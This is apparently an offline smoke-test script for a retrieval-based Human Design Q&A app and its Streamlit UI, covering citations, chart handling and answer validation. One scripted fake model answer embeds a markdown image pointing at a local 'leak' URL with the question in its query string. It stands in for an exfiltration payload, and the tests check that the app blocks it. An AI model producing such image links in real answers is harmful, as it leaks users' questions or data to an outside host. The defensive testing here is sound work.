"""Offline smoke check of the real focused Q&A flow and Streamlit UI.

Builds a synthetic PDF and a temporary hybrid index, then runs the checks listed
in docs/verification.md through the real PDF extraction, chunking, Chroma, BM25,
RRF, prompt rendering, answer validation and Streamlit app. Only the embedding
model, the answer model and Vision extraction are deterministic fakes. It never
reads .env, production indexes or private charts, and calls no provider.

    uv run python scripts/smoke_offline.py            # pipeline and UI checks
    uv run python scripts/smoke_offline.py --browser  # also drive headless Chrome

The exit status is 0 only when every check passes. Output names statuses, error
codes and citation IDs, never passages or prompts.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import math
import os
import re
import runpy
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from collections.abc import Callable, Generator
from contextlib import contextmanager
from dataclasses import dataclass, field, replace
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import patch

import pymupdf
from llama_index.core.base.embeddings.base import BaseEmbedding

import human_design.reading
from human_design.rag.bm25 import load_bm25_retriever
from human_design.rag.config import AppConfig, load_config
from human_design.rag.hybrid_index import build_hybrid_index, load_manifest
from human_design.rag.reranker import NoOpReranker
from human_design.rag.retriever import load_dense_retriever
from human_design.reading import ChartQuestionRequest, KnowledgeQuestionRequest, ReadingPipeline
from human_design.reading.generator import generate_answer
from human_design.reading.models import AnswerResult, PromptContext
from human_design.reading.pipeline import ReadingPipelineError
from human_design.vision.constants import PLANETARY_FIELDS, UNRESOLVED_BASIC_INFO_VALUES
from human_design.vision.interpreter import interpret_bodygraph
from human_design.vision.models import BodyGraphExtractionResult
from human_design.vision.parser import parse_bodygraph_raw_extraction_json
from human_design.vision.validation import validate_bodygraph_extraction


_REPO = Path(__file__).resolve().parents[1]
_APP = _REPO / "scripts/streamlit_app.py"
_CHART_RESPONSE = _REPO / "tests/fixtures/bodygraph/test1_raw_response.json"
_CHART_IMAGE = _REPO / "tests/fixtures/bodygraph/test1.png"
# Never fetched outside --browser; port 9 is the discard service.
_LEAK_PLACEHOLDER = "http://127.0.0.1:9/leak.png"

# Real books contain heading-only and page-number-only pages. Both shapes once failed
# valid answers as private_output, so the corpus keeps them next to normal passages.
_PAGES = (
    "Projector",
    "5",
    "The Projector type is designed to guide others and to recognize their gifts. "
    "The strategy is to wait for the invitation before sharing guidance.",
    "Sacral Authority responds in the moment with a gut sound. Generators with a "
    "defined Sacral Center use this response to decide.",
    "Emotional Authority means waiting through the emotional wave before deciding. "
    "Clarity comes over time rather than in the moment.",
    "Gate 5 is the Gate of Fixed Rhythms in the Sacral Center. It describes waiting "
    "patterns and consistent daily habits.",
    "Channel 24-61 connects the Head Center and the Ajna Center. It describes inspiration turning into inner knowing.",
)

_DECISION = "How should I make decisions?"
_PROFILE = "What is my Profile?"
_GROUPED = "What is Emotional Authority?"
_EXFILTRATION = "What is Sacral Authority?"


def _scripted_answers(leak_url: str) -> dict[str, tuple[str, list[str]]]:
    """Fake model output per question, in shapes real models produce."""
    return {
        "What is a Projector?": ("Projectors guide others and wait for the invitation [S1].", ["S1"]),
        "What does Gate 5 mean?": ("Gate 5 describes fixed rhythms and steady habits [S1].", ["S1"]),
        _GROUPED: ("Emotional Authority means waiting through the wave before deciding [S1, S2].", ["S1", "S2"]),
        _EXFILTRATION: (
            "Sacral Authority is a gut response in the moment [S1].\n\n"
            f"![chart]({leak_url}?q=Sacral-Authority-question)",
            ["S1"],
        ),
        "How is Sacral Authority different?": ("It responds in the moment [S1]. See [S9].", ["S1"]),
        _DECISION: ("Your Type, Authority and Strategy can guide reflective decisions [S1].", ["S1"]),
        _PROFILE: ("Your Profile describes a reflective learning style [S1].", ["S1"]),
        "What is my authority?": ("The chart facts do not include an Authority [S1].", ["S1"]),
    }


def _hash_vector(text: str) -> list[float]:
    vector = [0.0] * 63 + [0.01]  # never all zero, so cosine distance stays defined
    for word in re.findall(r"\w+", text.casefold()):
        vector[int.from_bytes(hashlib.sha256(word.encode()).digest()[:4], "big") % 63] += 1.0
    norm = math.sqrt(sum(value * value for value in vector))
    return [value / norm for value in vector]


class _HashEmbedding(BaseEmbedding):
    """Deterministic bag-of-words vectors, so dense ranking depends on shared words."""

    @classmethod
    def class_name(cls) -> str:
        return "OfflineSmokeHashEmbedding"

    def _get_query_embedding(self, query: str) -> list[float]:
        return _hash_vector(query)

    def _get_text_embedding(self, text: str) -> list[float]:
        return _hash_vector(text)

    async def _aget_query_embedding(self, query: str) -> list[float]:
        return _hash_vector(query)

    async def _aget_text_embedding(self, text: str) -> list[float]:
        return _hash_vector(text)


class _AnswerModel:
    """Fake Responses client; ``_test_only`` is the generator's offline test hook."""

    _test_only = True

    def __init__(self, payload: dict[str, object]) -> None:
        self._payload = payload
        self.responses: Any = self

    def create(self, **_request: object) -> SimpleNamespace:
        return SimpleNamespace(status="completed", output_text=json.dumps(self._payload))

    def close(self) -> None:
        pass


@dataclass
class _Recorder:
    """Prompt contexts the fake model received, for checks on what reached the prompt."""

    prompts: list[PromptContext] = field(default_factory=list)


@dataclass(frozen=True)
class Check:
    """One smoke result; feature is the ID in docs/verification.md."""

    feature: str
    name: str
    passed: bool
    detail: str


def _offline_config(work_dir: Path) -> AppConfig:
    # An explicit empty env never reads .env or process opt-ins, and holds no keys.
    return replace(
        load_config(env={}),
        pdf_dir=work_dir / "pdfs",
        index_dir=work_dir / "index",
        generation_model="offline-smoke-model",
    )


def _embedding_opt_in(config: AppConfig) -> AppConfig:
    # Satisfies only the build/load opt-in checks. The embedding model is always
    # injected, so no provider client is constructed with this placeholder.
    return replace(config, real_embeddings=True, openai_api_key="offline-placeholder")


def build_offline_index(work_dir: Path) -> AppConfig:
    """Write the synthetic PDF and build a real hybrid index in a new directory."""
    config = _offline_config(work_dir)
    config.pdf_dir.mkdir(parents=True)
    document = pymupdf.open()
    for text in _PAGES:
        document.new_page().insert_textbox(pymupdf.Rect(72, 72, 540, 770), text, fontsize=11)
    document.save(config.pdf_dir / "synthetic_smoke_book.pdf")
    build_hybrid_index(_embedding_opt_in(config), embed_model=_HashEmbedding())
    return config


def offline_pipeline(
    config: AppConfig,
    recorder: _Recorder,
    *,
    leak_url: str = _LEAK_PLACEHOLDER,
    extractor: Callable[[Path], BodyGraphExtractionResult] | None = None,
) -> ReadingPipeline:
    """The real pipeline over the offline index, with fake embedding, model and Vision."""
    answers = _scripted_answers(leak_url)

    def generate(prompt: PromptContext, generation_config: AppConfig) -> AnswerResult:
        recorder.prompts.append(prompt)
        answer, used = answers[prompt.user_question]
        payload = {
            "answer_markdown": answer,
            "used_source_ids": used,
            "used_chart_fact_paths": [fact.source_path for fact in prompt.chart_facts],
            "limitations": [],
        }
        return generate_answer(prompt, generation_config, client=_AnswerModel(payload))

    manifest = load_manifest(config.index_dir / "manifest.json")
    return ReadingPipeline(
        config=config,
        dense_retriever=load_dense_retriever(_embedding_opt_in(config), embed_model=_HashEmbedding()),
        sparse_retriever=load_bm25_retriever(config.index_dir / "bm25", manifest.ingestion_id),
        reranker=NoOpReranker(),
        generator=generate,
        extractor=extractor,
    )


def _chart(edit: Callable[[dict[str, Any]], None] | None = None) -> BodyGraphExtractionResult:
    payload = json.loads(_CHART_RESPONSE.read_text(encoding="utf-8"))
    if edit is not None:
        edit(payload)
    parsed = parse_bodygraph_raw_extraction_json(json.dumps(payload))
    interpreted = interpret_bodygraph(parsed.raw_vision)
    return BodyGraphExtractionResult(
        parsed.raw_vision,
        interpreted.derived_chart_data,
        validate_bodygraph_extraction(parse_result=parsed, interpretation_result=interpreted),
    )


def _head_ajna_only(payload: dict[str, Any]) -> None:
    """Gates 24 and 61 only: a Projector whose Authority the rules cannot derive."""
    for column in ("personality", "design"):
        for index, planet in enumerate(PLANETARY_FIELDS):
            payload[column][planet] = f"{(24, 61)[index % 2]}.{index % 6 + 1}"
    payload.update(
        visually_defined_centers=["Head", "Ajna"],
        visually_active_gates=[24, 61],
        visible_colored_channels=["24-61"],
        uncertain_items=[],
    )


def _missing_personality_sun(payload: dict[str, Any]) -> None:
    payload["personality"]["sun"] = None


def _outcome(result: AnswerResult | None, error_code: str | None) -> str:
    if result is None:
        return f"error={error_code}"
    return f"status={result.status.value} citations={[c.citation_id for c in result.citations]}"


_Verify = Callable[[AnswerResult | None, PromptContext | None], str | None]


def run_pipeline_checks(config: AppConfig) -> list[Check]:
    """Ask each scripted question through the real pipeline and compare outcomes."""
    recorder = _Recorder()
    pipeline = offline_pipeline(config, recorder)
    checks: list[Check] = []

    def ask(
        feature: str,
        name: str,
        question: str,
        expected: str,
        *,
        chart: BodyGraphExtractionResult | None = None,
        verify: _Verify | None = None,
    ) -> None:
        asked = len(recorder.prompts)
        result, error_code = None, None
        try:
            result = (
                pipeline.answer_knowledge_question(KnowledgeQuestionRequest(question))
                if chart is None
                else pipeline.answer_chart_question(ChartQuestionRequest(question, chart))
            )
        except ReadingPipelineError as exc:
            match = re.search(r"\[(\w+)\]", str(exc))
            error_code = match[1] if match else "pipeline_error"
        prompt = recorder.prompts[-1] if len(recorder.prompts) > asked else None
        detail = _outcome(result, error_code)
        problem = None if detail == expected else f"expected {expected}"
        if problem is None and verify is not None:
            problem = verify(result, prompt)
        checks.append(Check(feature, name, problem is None, detail if problem is None else f"{detail}; {problem}"))

    def repeats_a_whole_source(result: AnswerResult | None, prompt: PromptContext | None) -> str | None:
        # The scenario only proves something if the answer contains a complete final passage.
        echoed = (
            result is not None
            and prompt is not None
            and any(source.chunk.text.strip() in result.answer_markdown for source in prompt.sources)
        )
        return None if echoed else "precondition: the answer repeats no whole final source"

    def model_not_called(_result: AnswerResult | None, prompt: PromptContext | None) -> str | None:
        return None if prompt is None else "the answer model was called"

    def decision_facts(result: AnswerResult | None, _prompt: PromptContext | None) -> str | None:
        fields = {fact.field for fact in result.chart_facts_used} if result else set()
        return None if fields == {"type", "authority", "strategy"} else f"chart facts used: {sorted(fields)}"

    def no_unresolved_fact(_result: AnswerResult | None, prompt: PromptContext | None) -> str | None:
        if prompt is None:
            return "the answer model was not called"
        leaked = [fact.field for fact in prompt.chart_facts if fact.value in UNRESOLVED_BASIC_INFO_VALUES]
        return f"unresolved facts reached the prompt: {leaked}" if leaked else None

    ask("F1", "Knowledge answer cites its source", "What is a Projector?", "status=ok citations=['S1']")
    ask("F2", "Grouped [S1, S2] cites both sources", _GROUPED, "status=ok citations=['S1', 'S2']")
    ask(
        "F3",
        "Short page among sources is not a private echo",
        "What does Gate 5 mean?",
        "status=ok citations=['S1']",
        verify=repeats_a_whole_source,
    )
    ask("F4", "Markdown image in an answer is rejected", _EXFILTRATION, "error=unsafe_markdown")
    ask("F5", "Unknown citation is rejected", "How is Sacral Authority different?", "error=unknown_citation")
    ask(
        "F6",
        "Full-reading request asks for focus",
        "Give me a complete reading of my chart",
        "status=needs_focus citations=[]",
        verify=model_not_called,
    )
    ask(
        "F7",
        "Chart question uses the selected chart facts",
        _DECISION,
        "status=ok citations=['S1']",
        chart=_chart(),
        verify=decision_facts,
    )
    ask(
        "F8",
        "Underivable Authority never reaches the prompt",
        "What is my authority?",
        "status=ok citations=['S1']",
        chart=_chart(_head_ajna_only),
        verify=no_unresolved_fact,
    )
    ask(
        "F9",
        "Invalid chart stops before retrieval",
        _DECISION,
        "status=invalid_chart citations=[]",
        chart=_chart(_missing_personality_sun),
        verify=model_not_called,
    )
    return checks


def run_ui_checks(config: AppConfig) -> list[Check]:
    """Drive the real Streamlit app with Streamlit's AppTest over the real pipeline."""
    from streamlit.testing.v1 import AppTest

    recorder = _Recorder()
    chart = _chart()
    extractions: list[str] = []

    def extract(image_path: Path) -> BodyGraphExtractionResult:
        extractions.append(image_path.suffix)
        return chart

    def submit(app: Any, question: str) -> str:
        app.text_area(key="query").set_value(question)
        app.button(key="submit").click().run()
        if app.exception:
            return "exception"
        return f"error={app.error[0].value}" if app.error else "ok"

    checks: list[Check] = []
    with patch.object(
        human_design.reading, "ReadingPipeline", lambda: offline_pipeline(config, recorder, extractor=extract)
    ):
        app = AppTest.from_file(str(_APP), default_timeout=60).run()
        state = submit(app, _GROUPED)
        listed = [str(e.value).split("]", 1)[0] + "]" for e in app.text if str(e.value).startswith("[S")]
        checks.append(
            Check(
                "F2",
                "UI lists every grouped citation",
                state == "ok" and listed == ["[S1]", "[S2]"],
                f"{state} sources={listed}",
            )
        )

        state = submit(app, _EXFILTRATION)
        rendered = " ".join(str(element.value) for element in app.markdown)
        blocked = "[unsafe_markdown]" in state and "](" not in rendered and "leak" not in rendered
        checks.append(
            Check(
                "F4",
                "UI shows unsafe_markdown and renders no image",
                blocked,
                "unsafe_markdown shown" if blocked else state,
            )
        )

        app.file_uploader[0].set_value(("chart.png", _CHART_IMAGE.read_bytes(), "image/png"))
        first, second = submit(app, _DECISION), submit(app, _PROFILE)
        checks.append(
            Check(
                "F10",
                "Second question on the same chart skips extraction",
                first == second == "ok" and len(extractions) == 1,
                f"answers={first},{second} extractions={len(extractions)}",
            )
        )
    return checks


# Optional browser checks: the real app in a Streamlit server, driven by headless
# Chrome over the DevTools pipe. A local server records any image the page fetches.


class _LeakServer:
    """Local HTTP server that records request paths, standing in for an attacker."""

    def __init__(self) -> None:
        self.paths: list[str] = []
        paths = self.paths

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self) -> None:
                paths.append(self.path)
                self.send_response(404)
                self.end_headers()

            def log_message(self, format: str, *args: object) -> None:
                pass

        self._server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self._server.server_address[1]}/leak.png"

    def __enter__(self) -> _LeakServer:
        threading.Thread(target=self._server.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *_exc: object) -> None:
        self._server.shutdown()
        self._server.server_close()


class _Chrome:
    """Headless Chrome controlled over --remote-debugging-pipe (fds 3 and 4)."""

    def __init__(self, executable: str, profile: Path) -> None:
        command_read, self._command_write = os.pipe()
        self._reply_read, reply_write = os.pipe()

        def map_pipes() -> None:
            # In the child: move both ends above 4 first so the dup2 calls cannot clobber
            # each other, then place them at 3 and 4. dup2 copies are inheritable, while
            # Python's other descriptors are not (PEP 446), so exec keeps only these.
            high_command, high_reply = os.dup2(command_read, 100), os.dup2(reply_write, 101)
            os.dup2(high_command, 3)
            os.dup2(high_reply, 4)
            os.close(high_command)
            os.close(high_reply)

        self._process = subprocess.Popen(
            [
                executable,
                "--headless=new",
                "--remote-debugging-pipe",
                f"--user-data-dir={profile}",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-background-networking",
                "--disable-component-update",
                "--disable-sync",
                "--window-size=900,1400",
                "about:blank",
            ],
            close_fds=False,
            preexec_fn=map_pipes,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        os.close(command_read)
        os.close(reply_write)
        self._buffer = b""
        self._next_id = 0
        self._session: str | None = None
        try:
            target = next(t for t in self._send("Target.getTargets")["targetInfos"] if t["type"] == "page")
            self._session = self._send("Target.attachToTarget", {"targetId": target["targetId"], "flatten": True})[
                "sessionId"
            ]
        except Exception:
            self.close()
            raise

    def _send(self, method: str, params: dict[str, object] | None = None) -> dict[str, Any]:
        self._next_id += 1
        message: dict[str, object] = {"id": self._next_id, "method": method, "params": params or {}}
        if self._session is not None:
            message["sessionId"] = self._session
        os.write(self._command_write, json.dumps(message).encode() + b"\0")
        while True:
            while b"\0" not in self._buffer:
                chunk = os.read(self._reply_read, 1 << 16)
                if not chunk:
                    raise RuntimeError("Chrome closed the DevTools pipe")
                self._buffer += chunk
            raw, self._buffer = self._buffer.split(b"\0", 1)
            reply = json.loads(raw)
            if reply.get("id") == self._next_id:
                if "error" in reply:
                    raise RuntimeError(f"DevTools {method} failed")
                return reply["result"]

    def evaluate(self, expression: str) -> Any:
        return self._send("Runtime.evaluate", {"expression": expression, "returnByValue": True})["result"].get("value")

    def wait_for(self, expression: str, timeout: float = 60.0) -> bool:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            if self.evaluate(expression):
                return True
            time.sleep(0.25)
        return False

    def open(self, url: str) -> None:
        self._send("Page.navigate", {"url": url})
        if not self.wait_for("!!document.querySelector('textarea')"):
            raise RuntimeError("The Streamlit form did not load")

    def ask(self, question: str, done: str) -> bool:
        self.evaluate("(() => { const t = document.querySelector('textarea'); t.focus(); t.select(); })()")
        for kind in ("keyDown", "keyUp"):
            self._send(
                "Input.dispatchKeyEvent",
                {"type": kind, "key": "Backspace", "code": "Backspace", "windowsVirtualKeyCode": 8},
            )
        self._send("Input.insertText", {"text": question})
        time.sleep(0.5)  # let Streamlit receive the edited value before submitting
        self.evaluate("[...document.querySelectorAll('button')].find(b => b.innerText.includes('送出問題')).click()")
        finished = self.wait_for(done)
        time.sleep(1.5)  # leave time for any rendered image to be fetched
        return finished

    def text(self) -> str:
        return str(self.evaluate("document.querySelector('[data-testid=\"stMain\"]')?.innerText ?? ''"))

    def screenshot(self, path: Path) -> None:
        data = self._send("Page.captureScreenshot", {"format": "png", "captureBeyondViewport": True})["data"]
        path.write_bytes(base64.b64decode(data))

    def close(self) -> None:
        self._session = None  # Browser.close is a browser-level command
        try:
            self._send("Browser.close")
        except (OSError, RuntimeError):
            pass
        try:
            self._process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            self._process.kill()
            self._process.wait()
        finally:
            os.close(self._command_write)
            os.close(self._reply_read)


def _find_chrome() -> str | None:
    candidates = [
        os.environ.get("HD_SMOKE_CHROME"),
        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "/Applications/Chromium.app/Contents/MacOS/Chromium",
        *map(shutil.which, ("google-chrome", "google-chrome-stable", "chromium", "chromium-browser")),
    ]
    return next((c for c in candidates if c and Path(c).is_file()), None)


@contextmanager
def _streamlit_server(work_dir: Path, leak_url: str) -> Generator[str, None, None]:
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 0))
        port = probe.getsockname()[1]
    process = subprocess.Popen(
        [
            sys.executable,
            "-m",
            "streamlit",
            "run",
            str(Path(__file__).resolve()),
            "--server.headless=true",
            "--server.address=127.0.0.1",
            f"--server.port={port}",
            "--browser.gatherUsageStats=false",
            "--",
            "--serve-app",
            str(work_dir),
            "--leak-url",
            leak_url,
        ],
        cwd=_REPO,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    try:
        deadline = time.monotonic() + 60
        while True:
            try:
                with urllib.request.urlopen(f"http://127.0.0.1:{port}/_stcore/health", timeout=2):
                    break
            except OSError:
                if process.poll() is not None or time.monotonic() > deadline:
                    raise RuntimeError("The Streamlit server did not start") from None
                time.sleep(0.5)
        yield f"http://127.0.0.1:{port}/"
    finally:
        process.terminate()
        try:
            process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            process.kill()
            process.wait()


def run_browser_checks(work_dir: Path) -> list[Check]:
    """Render answers in real Chrome; screenshots go to <work_dir>/screenshots."""
    executable = _find_chrome()
    if executable is None:
        return [Check("F4", "Browser checks", False, "Chrome not found; set HD_SMOKE_CHROME")]
    screenshots = work_dir / "screenshots"
    screenshots.mkdir()
    checks: list[Check] = []
    with _LeakServer() as leak, _streamlit_server(work_dir, leak.url) as url:
        browser = _Chrome(executable, work_dir / "chrome-profile")
        try:
            browser.open(url)
            answered = browser.ask(
                _GROUPED,
                f"document.body.innerText.includes({json.dumps(_GROUPED)})"
                " && document.body.innerText.includes('參考來源')",
            )
            listed = re.findall(r"^\[(S\d+)\]", browser.text(), re.MULTILINE)
            browser.screenshot(screenshots / "grouped_citations.png")
            checks.append(
                Check(
                    "F2",
                    "Browser lists every grouped citation",
                    answered and listed == ["S1", "S2"],
                    f"sources={listed}",
                )
            )

            shown = browser.ask(_EXFILTRATION, "!!document.querySelector('[data-testid=\"stAlertContentError\"]')")
            error_shown = shown and "unsafe_markdown" in browser.text()
            browser.screenshot(screenshots / "unsafe_markdown.png")
            # Control: the page can reach the leak server, so zero answer fetches is meaningful.
            browser.evaluate(f"new Image().src = {json.dumps(leak.url + '?probe=control')}")
            time.sleep(1.0)
            reachable = any("probe=control" in path for path in leak.paths)
            fetched = [path for path in leak.paths if "probe=control" not in path]
            checks.append(
                Check(
                    "F4",
                    "Browser fetches nothing from a rejected answer",
                    error_shown and reachable and not fetched,
                    f"error_shown={error_shown} control_reached={reachable} answer_fetches={len(fetched)}",
                )
            )
        finally:
            browser.close()
    return checks


def _serve_app(work_dir: Path, leak_url: str) -> None:
    """Internal: run the real app inside `streamlit run` with the offline pipeline."""
    config = _offline_config(work_dir)
    chart = _chart()
    # Patch only while the app runs: Streamlit re-executes this script on every rerun,
    # and its own imports must keep resolving to the real ReadingPipeline.
    with patch.object(
        human_design.reading,
        "ReadingPipeline",
        lambda: offline_pipeline(config, _Recorder(), leak_url=leak_url, extractor=lambda _path: chart),
    ):
        runpy.run_path(str(_APP), run_name="__main__")


def _run(work_dir: Path, browser: bool) -> int:
    print(f"Offline smoke: synthetic corpus and index in {work_dir}")
    config = build_offline_index(work_dir)
    checks = run_pipeline_checks(config) + run_ui_checks(config)
    if browser:
        checks += run_browser_checks(work_dir)
    for check in checks:
        print(f"{'PASS' if check.passed else 'FAIL'} {check.feature:<4} {check.name:<50} {check.detail}")
    failed = sum(not check.passed for check in checks)
    print(f"{len(checks) - failed} passed, {failed} failed")
    if browser:
        print(f"Screenshots: {work_dir / 'screenshots'}")
    return 1 if failed else 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Offline smoke check of the real Q&A flow and Streamlit UI.")
    parser.add_argument(
        "--browser", action="store_true", help="also render answers in headless Chrome and save screenshots"
    )
    parser.add_argument(
        "--work-dir",
        type=Path,
        help="new or empty directory that keeps the corpus, index and screenshots "
        "(default: a temporary directory, kept only with --browser)",
    )
    parser.add_argument("--serve-app", type=Path, help=argparse.SUPPRESS)
    parser.add_argument("--leak-url", default=_LEAK_PLACEHOLDER, help=argparse.SUPPRESS)
    args = parser.parse_args(argv)
    if args.serve_app is not None:
        _serve_app(args.serve_app, args.leak_url)
        return 0
    if args.work_dir is not None:
        if args.work_dir.exists() and any(args.work_dir.iterdir()):
            parser.error("--work-dir must be new or empty")
        return _run(args.work_dir, args.browser)
    if args.browser:
        return _run(Path(tempfile.mkdtemp(prefix="hd-smoke-")), browser=True)
    with tempfile.TemporaryDirectory(prefix="hd-smoke-") as directory:
        return _run(Path(directory), browser=False)


if __name__ == "__main__":
    if "--serve-app" in sys.argv:
        main()  # inside `streamlit run`; exiting would end the app session
    else:
        sys.exit(main())
